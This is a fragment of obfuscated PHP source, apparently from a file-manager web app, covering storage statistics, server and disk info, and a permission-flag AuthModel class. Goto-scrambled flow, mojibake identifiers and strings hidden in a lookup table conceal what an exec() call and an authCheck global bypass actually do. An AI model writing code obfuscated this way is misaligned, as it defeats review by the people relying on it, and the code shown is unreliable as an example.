Model($C˜´ë€—°ø[2002])->where($Cñ™∞˘Ç◊“)->count($C˜´ë€—°ø[2003]); goto A·˜ΩΩèÁ‹; dó—êè∏€Í: $Cñ™∞˘Ç◊“ = array($C˜´ë€—°ø[194] => array($C˜´ë€—°ø[915], $e¢«ÊÉàØó)); $cŒ∑Ω¯√ü≠ = Model($C˜´ë€—°ø[481])->where($Cñ™∞˘Ç◊“)->count($C˜´ë€—°ø[1397]); $Cñ™∞˘Ç◊“[$C˜´ë€—°ø[194]] = array($C˜´ë€—°ø[327], array($Eå·Éµê≥‰, $e¢«ÊÉàØó)); goto dö’áÊ€óÑ; bß›Éöç®∞: } public function _recordStore($E˘˘ø˘Ï…â = '') { goto BÓµäË±Û’; CòÌÀÌ¬≈‹: $dØ‰∏†≥ñ[$CÇùèÒßÂ∫[376]] = 1; $cäè–äΩ◊« = Model($CÇùèÒßÂ∫[744])->where($dØ‰∏†≥ñ)->sum($CÇùèÒßÂ∫[87]); $dØ‰∏†≥ñ[$CÇùèÒßÂ∫[376]] = 2; goto c•Ù √óç; C»ÆÕæÂÇà: $C¢ÔÜË ÖÆ = Model($CÇùèÒßÂ∫[426])->where($dØ‰∏†≥ñ)->sum($CÇùèÒßÂ∫[87]); $dØ‰∏†≥ñ[$CÇùèÒßÂ∫[375]] = 0; $CÚ∞≠„åˆñ = Model($CÇùèÒßÂ∫[744])->where($dØ‰∏†≥ñ)->sum($CÇùèÒßÂ∫[87]); goto CòÌÀÌ¬≈‹; c•Ù √óç: $A∂ä¥ÕŒò˜ = Model($CÇùèÒßÂ∫[744])->where($dØ‰∏†≥ñ)->sum($CÇùèÒßÂ∫[87]); $fë¡¡§’ƒ¿ = array($CÇùèÒßÂ∫[217] => $E˘˘ø˘Ï…â, $CÇùèÒßÂ∫[690] => (int) $CÚ∞≠„åˆñ, $CÇùèÒßÂ∫[1992] => (int) $C¢ÔÜË ÖÆ, $CÇùèÒßÂ∫[1993] => (int) $cäè–äΩ◊«, $CÇùèÒßÂ∫[1994] => (int) $A∂ä¥ÕŒò˜); return $this->insert($fë¡¡§’ƒ¿); goto c÷©ŸùÊ•Ø; BÓµäË±Û’: $CÇùèÒßÂ∫ =& $_SERVER[Æ¡î¢≠¯™]; $Aü€ãÓ•ªö = strtotime(date($CÇùèÒßÂ∫[2000], strtotime($E˘˘ø˘Ï…â))); $dØ‰∏†≥ñ = array($CÇùèÒßÂ∫[194] => array($CÇùèÒßÂ∫[915], $Aü€ãÓ•ªö)); goto C»ÆÕæÂÇà; c÷©ŸùÊ•Ø: } public function trend($DÀúøÁ—Ã”, $aﬂƒä‘‘«ª) { goto FÓ«±‰ûÇÈ; AéÜœœœÌ’: return $BˆëÁ“áÏ; goto eÓ⁄éÖàïò; a∆•“ßúÖà: if ($eÙ◊´Ó¯Ûã && $aﬂƒä‘‘«ª != $AË‡≤‘Õ·[1372]) { $D£‹ßüÑøë = $eÙ◊´Ó¯Ûã[0][$AË‡≤‘Õ·[217]]; $cõãˆß¡ƒØ = $this->validDate($aﬂƒä‘‘«ª, $D£‹ßüÑøë); $e™≠û¬É¢£ = array(); $eìØßÚâïƒ = array_to_keyvalue($eÙ◊´Ó¯Ûã, $AË‡≤‘Õ·[217]); foreach ($cõãˆß¡ƒØ as $b¿Û‹Œ∑”£) { if (isset($eìØßÚâïƒ[$b¿Û‹Œ∑”£])) { $e¢∑Æ‹……® = $eìØßÚâïƒ[$b¿Û‹Œ∑”£]; } else { $e¢∑Æ‹……® = end($eÙ◊´Ó¯Ûã); $e¢∑Æ‹……®[$AË‡≤‘Õ·[217]] = $b¿Û‹Œ∑”£; if ($DÀúøÁ—Ã” == $AË‡≤‘Õ·[539]) { $e¢∑Æ‹……®[$AË‡≤‘Õ·[1988]] = $e¢∑Æ‹……®[$AË‡≤‘Õ·[1989]] = 0; } } $e™≠û¬É¢£[] = $e¢∑Æ‹……®; } $eÙ◊´Ó¯Ûã = $e™≠û¬É¢£; } $cÏ≈ñ»ı‰· = array($AË‡≤‘Õ·[539] => array($AË‡≤‘Õ·[692] => LNG($AË‡≤‘Õ·[2004]), $AË‡≤‘Õ·[1988] => LNG($AË‡≤‘Õ·[2005]), $AË‡≤‘Õ·[1989] => LNG($AË‡≤‘Õ·[2006])), $AË‡≤‘Õ·[1990] => array($AË‡≤‘Õ·[690] => LNG($AË‡≤‘Õ·[2007]), $AË‡≤‘Õ·[1992] => LNG($AË‡≤‘Õ·[2008]), $AË‡≤‘Õ·[1993] => LNG($AË‡≤‘Õ·[2009]), $AË‡≤‘Õ·[1994] => LNG($AË‡≤‘Õ·[2010]))); $AÇŸèöçé… = array($AË‡≤‘Õ·[539] => $AË‡≤‘Õ·[2011], $AË‡≤‘Õ·[1990] => $AË‡≤‘Õ·[87]); goto CÍ¨ëπ≈Á; CÍ¨ëπ≈Á: if (empty($eÙ◊´Ó¯Ûã)) { $b¿Û‹Œ∑”£ = date($AË‡≤‘Õ·[1995], strtotime($AË‡≤‘Õ·[1996])); $féÚËÆêÙ„ = array($AË‡≤‘Õ·[217] => $b¿Û‹Œ∑”£); foreach ($cÏ≈ñ»ı‰·[$DÀúøÁ—Ã”] as $F¶•èñç©Ò => $dÓé¶⁄∏á…) { $féÚËÆêÙ„[$F¶•èñç©Ò] = 0; } $eÙ◊´Ó¯Ûã[] = $féÚËÆêÙ„; } $BˆëÁ“áÏ = array(); foreach ($eÙ◊´Ó¯Ûã as $dÓé¶⁄∏á…) { if ($DÀúøÁ—Ã” == $AË‡≤‘Õ·[1990] && $dÓé¶⁄∏á…[$AË‡≤‘Õ·[1992]] > $dÓé¶⁄∏á…[$AË‡≤‘Õ·[690]]) { $dÓé¶⁄∏á…[$AË‡≤‘Õ·[1992]] = $dÓé¶⁄∏á…[$AË‡≤‘Õ·[690]]; } foreach ($cÏ≈ñ»ı‰·[$DÀúøÁ—Ã”] as $F¶•èñç©Ò => $b»õ±ã…–£) { $e¢∑Æ‹……® = array($AË‡≤‘Õ·[217] => $dÓé¶⁄∏á…[$AË‡≤‘Õ·[217]], $AË‡≤‘Õ·[1305] => $b»õ±ã…–£); $e¢∑Æ‹……®[$AÇŸèöçé…[$DÀúøÁ—Ã”]] = isset($dÓé¶⁄∏á…[$F¶•èñç©Ò]) ? $dÓé¶⁄∏á…[$F¶•èñç©Ò] : 0; $BˆëÁ“áÏ[] = $e¢∑Æ‹……®; } } goto AéÜœœœÌ’; FÓ«±‰ûÇÈ: $AË‡≤‘Õ· =& $_SERVER[Æ¡î¢≠¯™]; if (!$this->init($DÀúøÁ—Ã”)) { return !1; } $eÙ◊´Ó¯Ûã = $this->trendList($DÀúøÁ—Ã”); goto a∆•“ßúÖà; eÓ⁄éÖàïò: } public function validDate($BˆäÁ›¿≥Ö, $d∏ƒﬂ∏ªÜÀ) { goto dÈ˜éá‰·÷; EåúÙø¨ëÿ: return $bóÃˆˆ∑ä°; goto B†ûî¥ãÜ±; bûÖ˜çï†Ê: switch ($BˆäÁ›¿≥Ö) { case $Dµ⁄≥Ó∂≤±[1379]: $F∞£™õ¥ñ‰ = mktime(0, 0, 0, date($Dµ⁄≥Ó∂≤±[2012]), date($Dµ⁄≥Ó∂≤±[2013]) - date($Dµ⁄≥Ó∂≤±[1204]) + 7 - 7, date($Dµ⁄≥Ó∂≤±[2014])); $Cëﬂî»¨ô÷ = 0; do { $E∫∑Ò¯Œ—§ = date($Dµ⁄≥Ó∂≤±[1995], $F∞£™õ¥ñ‰ - 3600 * 24 * 7 * $Cëﬂî»¨ô÷); $bóÃˆˆ∑ä°[] = $E∫∑Ò¯Œ—§; $Cëﬂî»¨ô÷++; } while ($d∏ƒﬂ∏ªÜÀ < $E∫∑Ò¯Œ—§); break; case $Dµ⁄≥Ó∂≤±[1377]: $Cëﬂî»¨ô÷ = 1; do { $BÂ¥•ù˘∂Õ = date($Dµ⁄≥Ó∂≤±[2015], strtotime("\55\x20{$Cëﬂî»¨ô÷}\40\x6d\157\156\x74\x68\x73")); $bóÃˆˆ∑ä°[] = $BÂ¥•ù˘∂Õ; $Cëﬂî»¨ô÷++; } while ($d∏ƒﬂ∏ªÜÀ < $BÂ¥•ù˘∂Õ); break; case $Dµ⁄≥Ó∂≤±[1682]: $Dáƒ«¥ß»È = (int) date($Dµ⁄≥Ó∂≤±[2014], strtotime($d∏ƒﬂ∏ªÜÀ)); $fÁéï•÷ò† = (int) date($Dµ⁄≥Ó∂≤±[2014]); if ($Dáƒ«¥ß»È >= $fÁéï•÷ò†) { break; } for ($Dáƒ«¥ß»È; $Dáƒ«¥ß»È < $fÁéï•÷ò†; $Dáƒ«¥ß»È++) { $bóÃˆˆ∑ä°[] = $Dáƒ«¥ß»È . $Dµ⁄≥Ó∂≤±[2016]; } break; default: break; } if ($d∏ƒﬂ∏ªÜÀ > end($bóÃˆˆ∑ä°)) { array_pop($bóÃˆˆ∑ä°); } sort($bóÃˆˆ∑ä°); goto EåúÙø¨ëÿ; dÈ˜éá‰·÷: $Dµ⁄≥Ó∂≤± =& $_SERVER[Æ¡î¢≠¯™]; $A∂õ§ïÈÑ≥ = date($Dµ⁄≥Ó∂≤±[1995], strtotime($Dµ⁄≥Ó∂≤±[1996])); $bóÃˆˆ∑ä° = array($A∂õ§ïÈÑ≥); goto bûÖ˜çï†Ê; B†ûî¥ãÜ±: } public function listTable($c¢◊Â®ÇºÓ) { $fÂöªü–Ìä = ucfirst($c¢◊Â®ÇºÓ); return Model($fÂöªü–Ìä)->listData(); } public function option($fóÓ’—Ö‰‹) { $bó¨≥≤Œë∫ = $_SERVER[Æ¡î¢≠¯™][2017] . ucfirst($fóÓ’—Ö‰‹); return $this->{$bó¨≥≤Œë∫}(); } private function optionUser() { goto A¨ÉΩ“ã¡—; E¿Áˆñπì∆: if (!$aü∆ˆ®»Æ∆) { $aü∆ˆ®»Æ∆ = 1; } $d¶µäÇí¥‡ = strtotime(date($c∞Í©§«˘ì[1999])); $D√ÒÇ‡µ—É = array($c∞Í©§«˘ì[2020] => array($c∞Í©§«˘ì[916], $d¶µäÇí¥‡)); goto bÕîÆ“ÎŸ∆; DÚ˘ˆÿÉ´®: $d¶µäÇí¥‡ = strtotime($c∞Í©§«˘ì[2019]); $D√ÒÇ‡µ—É = array($c∞Í©§«˘ì[2020] => array($c∞Í©§«˘ì[916], $d¶µäÇí¥‡)); $aü∆ˆ®»Æ∆ = (int) Model($c∞Í©§«˘ì[481])->where($D√ÒÇ‡µ—É)->count($c∞Í©§«˘ì[1397]); goto E¿Áˆñπì∆; A¨ÉΩ“ã¡—: $c∞Í©§«˘ì =& $_SERVER[Æ¡î¢≠¯™]; $d√ØíØÇ∆¿ = Model($c∞Í©§«˘ì[481])->count($c∞Í©§«˘ì[1397]); $d‹£Üú•„¬ = Model($c∞Í©§«˘ì[481])->where($c∞Í©§«˘ì[2018])->count($c∞Í©§«˘ì[1397]); goto DÚ˘ˆÿÉ´®; bÕîÆ“ÎŸ∆: $D•ﬁ†Ââê… = Model($c∞Í©§«˘ì[481])->where($D√ÒÇ‡µ—É)->count($c∞Í©§«˘ì[1397]); return array($c∞Í©§«˘ì[687] => (int) $d√ØíØÇ∆¿, $c∞Í©§«˘ì[2021] => (int) ($d√ØíØÇ∆¿ - $d‹£Üú•„¬), $c∞Í©§«˘ì[2022] => (int) $d‹£Üú•„¬, $c∞Í©§«˘ì[2023] => (int) $D•ﬁ†Ââê…, $c∞Í©§«˘ì[2024] => $aü∆ˆ®»Æ∆); goto AòÛ”»”¨Í; AòÛ”»”¨Í: } private function optionFile() { goto d…¢À‰ﬂÆÃ; D’§ââ“æø: $dπáãêÓúû = Model($Fù§†ÁßÇß[744])->where($f›ãÁïˆ™∫)->sum($Fù§†ÁßÇß[87]); $FÀ—ÏœıÍ = Model($Fù§†ÁßÇß[744])->where($f›ãÁïˆ™∫)->count($Fù§†ÁßÇß[374]); return array($Fù§†ÁßÇß[690] => $B§ªåı¿≥≠, $Fù§†ÁßÇß[1992] => $aïﬁ·π‰ïä, $Fù§†ÁßÇß[2025] => $B§ªåı¿≥≠ - $aïﬁ·π‰ïä, $Fù§†ÁßÇß[2026] => (int) $dπáãêÓúû, $Fù§†ÁßÇß[692] => (int) $EŒ≠ãáÑ⁄É, $Fù§†ÁßÇß[2027] => (int) $FÀ—ÏœıÍ); goto aŒÊì⁄ìÜâ; b≈‘à„ŸÛ∞: $aïﬁ·π‰ïä = $DƒÌûßí¥·[$Fù§†ÁßÇß[1992]]; $EŒ≠ãáÑ⁄É = Model($Fù§†ÁßÇß[744])->where(array($Fù§†ÁßÇß[375] => 0))->count($Fù§†ÁßÇß[374]); $f›ãÁïˆ™∫ = array($Fù§†ÁßÇß[375] => 0, $Fù§†ÁßÇß[194] => array($Fù§†ÁßÇß[916], strtotime(date($Fù§†ÁßÇß[1999])))); goto D’§ââ“æø; d…¢À‰ﬂÆÃ: $Fù§†ÁßÇß =& $_SERVER[Æ¡î¢≠¯™]; $DƒÌûßí¥· = $this->sourceSize(); $B§ªåı¿≥≠ = $DƒÌûßí¥·[$Fù§†ÁßÇß[87]]; goto b≈‘à„ŸÛ∞; aŒÊì⁄ìÜâ: } private function optionAccess() { $D˜Ñ£«á˜‹ =& $_SERVER[Æ¡î¢≠¯™]; return array($D˜Ñ£«á˜‹[687] => $this->typeLogCnt(), $D˜Ñ£«á˜‹[101] => $this->typeLogCnt($D˜Ñ£«á˜‹[101]), $D˜Ñ£«á˜‹[408] => $this->typeLogCnt($D˜Ñ£«á˜‹[408]), $D˜Ñ£«á˜‹[2028] => $this->typeLogCnt($D˜Ñ£«á˜‹[2028]), $D˜Ñ£«á˜‹[2029] => $this->typeLogCnt($D˜Ñ£«á˜‹[2029]), $D˜Ñ£«á˜‹[539] => $this->typeLogCnt($D˜Ñ£«á˜‹[33], $D˜Ñ£«á˜‹[2003])); } private function typeLogCnt($dÌ√ØÇúñ¢ = '', $c“Üµ±•õÊ = "\x69\144") { goto A€ı»üæÎ; A€ı»üæÎ: $Eµ≥Á¬Ó§ﬂ =& $_SERVER[Æ¡î¢≠¯™]; $bí±Ã∞ƒÎ´ = array($Eµ≥Á¬Ó§ﬂ[101] => array($Eµ≥Á¬Ó§ﬂ[2030], $Eµ≥Á¬Ó§ﬂ[2031]), $Eµ≥Á¬Ó§ﬂ[408] => array($Eµ≥Á¬Ó§ﬂ[2032], $Eµ≥Á¬Ó§ﬂ[2033]), $Eµ≥Á¬Ó§ﬂ[2028] => array($Eµ≥Á¬Ó§ﬂ[2034], $Eµ≥Á¬Ó§ﬂ[2035]), $Eµ≥Á¬Ó§ﬂ[2029] => array($Eµ≥Á¬Ó§ﬂ[2036], $Eµ≥Á¬Ó§ﬂ[2037]), $Eµ≥Á¬Ó§ﬂ[2038] => array($Eµ≥Á¬Ó§ﬂ[2039], $Eµ≥Á¬Ó§ﬂ[2040], $Eµ≥Á¬Ó§ﬂ[2041])); $a¡¢ÂÌû‘á = strtotime(date($Eµ≥Á¬Ó§ﬂ[1999])); goto cÃ‰√ç§í; c¶∏ø®•é«: return (int) $b—œƒù∞Ω¿; goto d…¢—ë‹¢Ù; cÃ‰√ç§í: $dﬁçÚöÑπ· = array($Eµ≥Á¬Ó§ﬂ[194] => array($Eµ≥Á¬Ó§ﬂ[916], $a¡¢ÂÌû‘á)); if ($dÌ√ØÇúñ¢) { $dﬁçÚöÑπ·[$Eµ≥Á¬Ó§ﬂ[29]] = array($Eµ≥Á¬Ó§ﬂ[7], $bí±Ã∞ƒÎ´[$dÌ√ØÇúñ¢]); } $b—œƒù∞Ω¿ = Model($Eµ≥Á¬Ó§ﬂ[2002])->where($dﬁçÚöÑπ·)->count($c“Üµ±•õÊ); goto c¶∏ø®•é«; d…¢—ë‹¢Ù: } private function optionServer() { goto eÿÑ’‰ÓÑ¯; bØ˘°ƒº§î: if ($C‚Û’∞‚„ == $fæûÊäèπ∏[716]) { $c«ÑìÀÖ¥· = explode($fæûÊäèπ∏[1062], $d»èä††ƒ”[$fæûÊäèπ∏[875]]); $C‚Û’∞‚„ = $c«ÑìÀÖ¥·[0]; } if ($C‚Û’∞‚„ == $fæûÊäèπ∏[719] || $C‚Û’∞‚„ == $fæûÊäèπ∏[720]) { $eéïïÂ‰é∏ = Model()->db()->query($fæûÊäèπ∏[2042]); $fÃùÿòó®ﬂ = $eéïïÂ‰é∏[0] && isset($eéïïÂ‰é∏[0][$fæûÊäèπ∏[1304]]) ? $eéïïÂ‰é∏[0][$fæûÊäèπ∏[1304]] : 0; $C‚Û’∞‚„ = $fæûÊäèπ∏[2043] . ($fÃùÿòó®ﬂ ? $fæûÊäèπ∏[8] . $fÃùÿòó®ﬂ : $fæûÊäèπ∏[33]); } $AÂ’ÍΩÁªª = $GLOBALS[$fæûÊäèπ∏[6]][$fæûÊäèπ∏[343]][$fæûÊäèπ∏[745]]; goto a¯âå®ÒÚù; Dä◊éÑÖï±: $E’€ ‹ ù = array($fæûÊäèπ∏[735] => $FŒöπï€ »[$fæûÊäèπ∏[372]]); $bﬂﬁ¬§Üüî = Model($fæûÊäèπ∏[426])->where($E’€ ‹ ù)->sum($fæûÊäèπ∏[87]); $bµåòí±ªü = explode($fæûÊäèπ∏[50], $_SERVER[$fæûÊäèπ∏[148]]); goto aê˜∞ãÚÎÍ; a¯âå®ÒÚù: return array($fæûÊäèπ∏[2044] => $EàÊëº≤èá ? $EàÊëº≤èá[$fæûÊäèπ∏[2045]] : 0, $fæûÊäèπ∏[2046] => $EàÊëº≤èá ? $EàÊëº≤èá[$fæûÊäèπ∏[2047]] : 0, $fæûÊäèπ∏[2048] => (int) $FŒöπï€ »[$fæûÊäèπ∏[2045]] * 1024 * 1024 * 1024, $fæûÊäèπ∏[2049] => (int) $bﬂﬁ¬§Üüî, $fæûÊäèπ∏[2050] => ucfirst($a˘ö…Í√Ñõ), $fæûÊäèπ∏[2051] => $fæûÊäèπ∏[2052] . PHP_VERSION, $fæûÊäèπ∏[2053] => phpBuild64() ? 64 : 32, $fæûÊäèπ∏[686] => str_replace($fæûÊäèπ∏[2054], $fæûÊäèπ∏[892], $C‚Û’∞‚„), $fæûÊäèπ∏[343] => ucfirst($AÂ’ÍΩÁªª), $fæûÊäèπ∏[28] => $_SERVER[$fæûÊäèπ∏[2055]]); goto EíœÉﬁ‚∫µ; aê˜∞ãÚÎÍ: $a˘ö…Í√Ñõ = $bµåòí±ªü[0]; $d»èä††ƒ” = $GLOBALS[$fæûÊäèπ∏[6]][$fæûÊäèπ∏[17]]; $C‚Û’∞‚„ = $d»èä††ƒ”[$fæûÊäèπ∏[876]]; goto bØ˘°ƒº§î; eÿÑ’‰ÓÑ¯: $fæûÊäèπ∏ =& $_SERVER[Æ¡î¢≠¯™]; $EàÊëº≤èá = $this->diskDriver(); $FŒöπï€ » = KodIO::defaultDriver(); goto Dä◊éÑÖï±; EíœÉﬁ‚∫µ: } private function diskDriver() { goto F¿ëÑ‚√ìı; cºô≥æ≈¨ê: if ($BÀ«ÔÕ° ∑) { $eâﬂÆøï∫Ï = $a…º¥∆ıÆ¥[2058]; if (function_exists($a…º¥∆ıÆ¥[2059])) { exec($a…º¥∆ıÆ¥[2060], $e«¨‹ÀÆ≤ä); $eâﬂÆøï∫Ï = $e«¨‹ÀÆ≤ä[1] . $a…º¥∆ıÆ¥[8]; } } if (!file_exists($eâﬂÆøï∫Ï)) { return; } $eªîÂ∑Óÿ‹ = @disk_total_space($eâﬂÆøï∫Ï); goto BßÁ‡†¯À⁄; BßÁ‡†¯À⁄: $d÷¡œ±ÙŸØ = $eªîÂ∑Óÿ‹ - @disk_free_space($eâﬂÆøï∫Ï); return array($a…º¥∆ıÆ¥[2045] => $eªîÂ∑Óÿ‹, $a…º¥∆ıÆ¥[2047] => $d÷¡œ±ÙŸØ); goto Aå‰àƒı¯®; F¿ëÑ‚√ìı: $a…º¥∆ıÆ¥ =& $_SERVER[Æ¡î¢≠¯™]; $eâﬂÆøï∫Ï = $a…º¥∆ıÆ¥[8]; $BÀ«ÔÕ° ∑ = $GLOBALS[$a…º¥∆ıÆ¥[6]][$a…º¥∆ıÆ¥[2056]] == $a…º¥∆ıÆ¥[2057]; goto cºô≥æ≈¨ê; Aå‰àƒı¯®: } public function fileChart($f‹ÀÛ“∫Çó) { goto Cƒ√àú¥‚Ú; F∑Ë¥∆Ÿ¢Ω: $aâÒç¨Ñ™Ê = $this->sourceSize(); $D≈€Ò—‰å∞ = array($BÕ©—ÿàÒ¿[465] => 0, $BÕ©—ÿàÒ¿[376] => 1); $fí›ÒÆÌíã = Model($BÕ©—ÿàÒ¿[744])->where($D≈€Ò—‰å∞)->sum($BÕ©—ÿàÒ¿[87]); goto c•òÚÎ∞Ô˘; c•òÚÎ∞Ô˘: $D≈€Ò—‰å∞[$BÕ©—ÿàÒ¿[376]] = 2; $B¬≤Œ‰Ÿ·ô = Model($BÕ©—ÿàÒ¿[744])->where($D≈€Ò—‰å∞)->sum($BÕ©—ÿàÒ¿[87]); return array($BÕ©—ÿàÒ¿[690] => $aâÒç¨Ñ™Ê[$BÕ©—ÿàÒ¿[87]], $BÕ©—ÿàÒ¿[1992] => $aâÒç¨Ñ™Ê[$BÕ©—ÿàÒ¿[1992]], $BÕ©—ÿàÒ¿[1993] => (int) $fí›ÒÆÌíã, $BÕ©—ÿàÒ¿[1994] => (int) $B¬≤Œ‰Ÿ·ô); goto b‚“çÑ“…Ö; Cƒ√àú¥‚Ú: $BÕ©—ÿàÒ¿ =& $_SERVER[Æ¡î¢≠¯™]; if (isset($f‹ÀÛ“∫Çó[$BÕ©—ÿàÒ¿[1397]])) { return Model($BÕ©—ÿàÒ¿[744])->userFileTypeProfile($f‹ÀÛ“∫Çó[$BÕ©—ÿàÒ¿[1397]]); } if (isset($f‹ÀÛ“∫Çó[$BÕ©—ÿàÒ¿[2061]])) { return Model($BÕ©—ÿàÒ¿[744])->groupFileTypeProfile($f‹ÀÛ“∫Çó[$BÕ©—ÿàÒ¿[2061]]); } goto F∑Ë¥∆Ÿ¢Ω; b‚“çÑ“…Ö: } private function sourceSize() { $B°≥Ãﬁí≥ =& $_SERVER[Æ¡î¢≠¯™]; $d»‹›√‡≥Ω = Model($B°≥Ãﬁí≥[744])->where(array($B°≥Ãﬁí≥[375] => 0))->sum($B°≥Ãﬁí≥[87]); $e™ùçô√•î = Model($B°≥Ãﬁí≥[426])->sum($B°≥Ãﬁí≥[87]); if ($e™ùçô√•î > $d»‹›√‡≥Ω) { $e™ùçô√•î = $d»‹›√‡≥Ω; } return array($B°≥Ãﬁí≥[87] => (int) $d»‹›√‡≥Ω, $B°≥Ãﬁí≥[1992] => (int) $e™ùçô√•î); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $DúÔÆπ˜¬◊ =& $_SERVER[Æ¡î¢≠¯™]; $a‹∆È≈¨±ˆ = array(array($DúÔÆπ˜¬◊[391] => LNG($DúÔÆπ˜¬◊[2062]), $DúÔÆπ˜¬◊[2063] => $DúÔÆπ˜¬◊[2064], $DúÔÆπ˜¬◊[2065] => 6, $DúÔÆπ˜¬◊[2066] => 1, $DúÔÆπ˜¬◊[2067] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($DúÔÆπ˜¬◊[391] => LNG($DúÔÆπ˜¬◊[2068]), $DúÔÆπ˜¬◊[2063] => $DúÔÆπ˜¬◊[2069], $DúÔÆπ˜¬◊[2065] => 1, $DúÔÆπ˜¬◊[2066] => 1, $DúÔÆπ˜¬◊[2067] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($DúÔÆπ˜¬◊[391] => LNG($DúÔÆπ˜¬◊[2070]), $DúÔÆπ˜¬◊[2063] => $DúÔÆπ˜¬◊[2071], $DúÔÆπ˜¬◊[2065] => 2, $DúÔÆπ˜¬◊[2066] => 1, $DúÔÆπ˜¬◊[2067] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($DúÔÆπ˜¬◊[391] => LNG($DúÔÆπ˜¬◊[2072]), $DúÔÆπ˜¬◊[2063] => $DúÔÆπ˜¬◊[2071], $DúÔÆπ˜¬◊[2065] => 3, $DúÔÆπ˜¬◊[2066] => 1, $DúÔÆπ˜¬◊[2067] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($DúÔÆπ˜¬◊[391] => LNG($DúÔÆπ˜¬◊[2073]), $DúÔÆπ˜¬◊[2063] => $DúÔÆπ˜¬◊[2074], $DúÔÆπ˜¬◊[2065] => 4, $DúÔÆπ˜¬◊[2066] => 1, $DúÔÆπ˜¬◊[2067] => self::AUTH_SHOW | self::AUTH_VIEW), array($DúÔÆπ˜¬◊[391] => LNG($DúÔÆπ˜¬◊[2075]), $DúÔÆπ˜¬◊[2063] => $DúÔÆπ˜¬◊[2076], $DúÔÆπ˜¬◊[2065] => 5, $DúÔÆπ˜¬◊[2066] => 1, $DúÔÆπ˜¬◊[2067] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($DúÔÆπ˜¬◊[391] => LNG($DúÔÆπ˜¬◊[2077]), $DúÔÆπ˜¬◊[2063] => $DúÔÆπ˜¬◊[2078], $DúÔÆπ˜¬◊[2065] => 7, $DúÔÆπ˜¬◊[2066] => 1, $DúÔÆπ˜¬◊[2067] => 0)); return $a‹∆È≈¨±ˆ; } public static function authCheck($C¿ÏÙÙÆâÕ, $Bú‡¶ë€ä) { $C¿ÏÙÙÆâÕ = intval($C¿ÏÙÙÆâÕ); if (_get($GLOBALS, $_SERVER[Æ¡î¢≠¯™][461])) { return !0; } if ($C¿ÏÙÙÆâÕ <= 0) { return !1; } if (($C¿ÏÙÙÆâÕ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($C¿ÏÙÙÆâÕ & $Bú‡¶ë€ä); } public static function authCheckShow($dœüËËò◊√) { return self::authCheck($dœüËËò◊√, self::AUTH_SHOW); } public static function authCheckView($eÀ¨≠≠≤“ê) { return self::authCheck($eÀ¨≠≠≤“ê, self::AUTH_VIEW); } public static function authCheckDownload($Aûú‹›Ü¨£) { return self::authCheck($Aûú‹›Ü¨£, self::AUTH_DOWNLOAD); } public static function authCheckUpload($D√‹≥ˆ˜Çç) { return self::authCheck($D√‹≥ˆ˜Çç, self::AUTH_UPLOAD); } public static function authCheckEdit($C„Ø’°äë÷) { return self::authCheck($C„Ø’°äë÷, self::AUTH_EDIT); } public static function authCheckRemove($dÃﬂüˆ€œ…) { return self::authCheck($dÃﬂüˆ€œ…, self::AUTH_REMOVE); } public static function authCheckShare($aÓû‰â„¬Ñ) { return self::authCheck($aÓû‰â„¬Ñ, self::AUTH_SHARE); } public static function authCheckComment($f™ÒÃÕÔÈÛ) { return self::authCheck($f™ÒÃÕÔÈÛ, self::AUTH_COMMENT); } public static function authCheckEvent($f¡„ƒëú¿ß) { return self::authCheck($f¡„ƒëú¿ß, self::AUTH_EVENT); } public static function authCheckRoot($bå Ûí‹å”) { return self::authCheck($bå Ûí‹å”, self::AUTH_ROOT); } public static function authDisable($d‘ˆ¢éÑ‘ã, $böµÏé‚œÒ) { if (intval($d‘ˆ¢éÑ‘ã) <= 0) { return 0; } return intval($d‘ˆ¢éÑ‘ã) & ~$böµÏé‚œÒ; } public $optionType = "\123\x79\163\x74\145\x6d\56\163\157\x75\x72\143\x65\x41\165\x74\150\x4c\x69\x73\x74"; public $field = array("\x6e\141\155\x65", "\141\165\164\x68", "\x6c\x61\142\145\x6c", "\144\x69\163\160\x6c\x61\171", "\163\171\163\164\145\x6d", "\x73\x6f\x72\x74"); public function initData() { $c°îøªÿëÈ = $this->authDefault(); foreach ($c°îøªÿëÈ as $AŒ™ ì· ï) { $this->add($AŒ™ ì· ï); } } public function listData($fÃ±òÎ´µ´ = false, $b¶î…ç≥ö® = "\x73\157\162\x74", $cäÛª∂ﬁ†ß = false) { return parent::listData($fÃ±òÎ´µ´, $b¶î…ç≥ö®, $cäÛª∂ﬁ†ß); } public function update($DÁ¥øÆÇ∫¢, $AÑ£çµÍ†) { $eâ◊‚©úË“ =& $_SERVER[Æ¡î¢≠¯™]; $cûÓ‰‹üÃ∆ = parent::listData($DÁ¥øÆÇ∫¢); $bì‚™±ŒŸ÷ = $this->findByName($AÑ£çµÍ†[$eâ◊‚©úË“[28]]); if (!$cûÓ‰‹üÃ∆ || $bì‚™±ŒŸ÷ && $bì‚™±ŒŸ÷[$eâ◊‚©úË“[372]] != $cûÓ‰‹üÃ∆[$eâ◊‚©úË“[372]]) { return !1; } $this->filterAuth($AÑ£çµÍ†[$eâ◊‚©úË“[381]]); return parent::update($DÁ¥øÆÇ∫¢, $AÑ£çµÍ†); } public function remove($A´ﬂÇ˘ëÁÛ) { $fÏ•É€”ø¡ = parent::listData($A´ﬂÇ˘ëÁÛ); if (!$fÏ•É€”ø¡ || $fÏ•É€”ø¡[$_SERVER[Æ¡î¢≠¯™][1066]]) { return !1; } return 